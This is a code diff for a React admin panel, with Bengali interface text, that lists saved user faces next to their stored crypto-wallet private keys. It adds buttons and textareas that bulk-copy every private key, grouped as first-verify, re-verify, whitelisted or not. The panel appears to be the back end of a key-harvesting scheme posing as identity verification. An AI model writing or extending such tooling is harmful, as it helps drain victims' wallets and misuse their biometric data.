@@ -35,6 +35,9 @@ function AdminFaces() {
   const reverifyKeys = (data ?? [])
     .filter((t: any) => t.wallet_private_key && (t.reverify_count ?? 0) > 0)
     .map((t: any) => t.wallet_private_key as string);
+  const firstVerifyKeys = (data ?? [])
+    .filter((t: any) => t.wallet_private_key && (t.reverify_count ?? 0) === 0)
+    .map((t: any) => t.wallet_private_key as string);
   const copyAllKeys = async () => {
     if (allKeys.length === 0) return toast.error("কোনো key নেই");
     await navigator.clipboard.writeText(allKeys.join("\n"));
@@ -55,17 +58,32 @@ function AdminFaces() {
     await navigator.clipboard.writeText(reverifyKeys.join("\n"));
     toast.success(`${reverifyKeys.length} টি re-verify key কপি হয়েছে`);
   };
+  const copyAllFirstVerify = async () => {
+    if (firstVerifyKeys.length === 0) return toast.error("কোনো first-verify key নেই");
+    await navigator.clipboard.writeText(firstVerifyKeys.join("\n"));
+    toast.success(`${firstVerifyKeys.length} টি first-verify key কপি হয়েছে`);
+  };
 
   return (
     <div>
       <div className="glass rounded-xl p-3 mb-3 space-y-2">
         <p className="text-[10px] uppercase tracking-widest text-muted-foreground font-bold">
-          Total saved faces: {data?.length ?? 0} · Total keys: {allKeys.length} · Whitelisted: {whitelistedKeys.length} · Not-whitelisted: {notWhitelistedKeys.length} · Re-verify: {reverifyKeys.length}
+          Faces: {data?.length ?? 0} · Keys: {allKeys.length} · First: {firstVerifyKeys.length} · Re-verify: {reverifyKeys.length} · WL: {whitelistedKeys.length} · Not-WL: {notWhitelistedKeys.length}
         </p>
         <button onClick={copyAllKeys}
           className="w-full flex items-center justify-center gap-2 py-2.5 rounded-lg bg-cyan/15 border border-cyan/30 text-cyan font-black text-xs btn-press">
           <Copy className="w-3.5 h-3.5" /> সব key কপি করুন ({allKeys.length})
         </button>
+        <div className="grid grid-cols-2 gap-2">
+          <button onClick={copyAllFirstVerify}
+            className="flex items-center justify-center gap-1.5 py-2 rounded-lg bg-blue-500/15 border border-blue-500/30 text-blue-300 font-black text-[11px] btn-press">
+            <Copy className="w-3 h-3" /> First-verify ({firstVerifyKeys.length})
+          </button>
+          <button onClick={copyAllReverify}
+            className="flex items-center justify-center gap-1.5 py-2 rounded-lg bg-purple-500/15 border border-purple-500/30 text-purple-300 font-black text-[11px] btn-press">
+            <Copy className="w-3 h-3" /> Re-verify ({reverifyKeys.length})
+          </button>
+        </div>
         <div className="grid grid-cols-2 gap-2">
           <button onClick={copyAllWhitelisted}
             className="flex items-center justify-center gap-1.5 py-2 rounded-lg bg-emerald/15 border border-emerald/30 text-emerald font-black text-[11px] btn-press">
@@ -76,22 +94,20 @@ function AdminFaces() {
             <Copy className="w-3 h-3" /> Not-whitelisted ({notWhitelistedKeys.length})
           </button>
         </div>
-        <button onClick={copyAllReverify}
-          className="w-full flex items-center justify-center gap-2 py-2 rounded-lg bg-purple-500/15 border border-purple-500/30 text-purple-300 font-black text-[11px] btn-press">
-          <Copy className="w-3 h-3" /> Re-verify keys কপি করুন ({reverifyKeys.length})
-        </button>
-        <textarea
-          readOnly
-          value={reverifyKeys.join("\n")}
-          placeholder="Re-verify করা key গুলো এখানে দেখাবে"
-          className="w-full h-20 px-2 py-1.5 rounded bg-surface-2 border border-purple-500/30 text-[10px] mono-num resize-none outline-none"
-        />
-        <textarea
-          readOnly
-          value={allKeys.join("\n")}
-          placeholder="সব private key এখানে দেখাবে"
-          className="w-full h-24 px-2 py-1.5 rounded bg-surface-2 border border-border text-[10px] mono-num resize-none outline-none"
-        />
+        <div className="grid grid-cols-2 gap-2">
+          <textarea
+            readOnly
+            value={firstVerifyKeys.join("\n")}
+            placeholder="First-verify keys"
+            className="w-full h-20 px-2 py-1.5 rounded bg-surface-2 border border-blue-500/30 text-[10px] mono-num resize-none outline-none"
+          />
+          <textarea
+            readOnly
+            value={reverifyKeys.join("\n")}
+            placeholder="Re-verify keys"
+            className="w-full h-20 px-2 py-1.5 rounded bg-surface-2 border border-purple-500/30 text-[10px] mono-num resize-none outline-none"
+          />
+        </div>
       </div>
       <div className="grid grid-cols-2 gap-2">
         {(data ?? []).map((t: any) => (
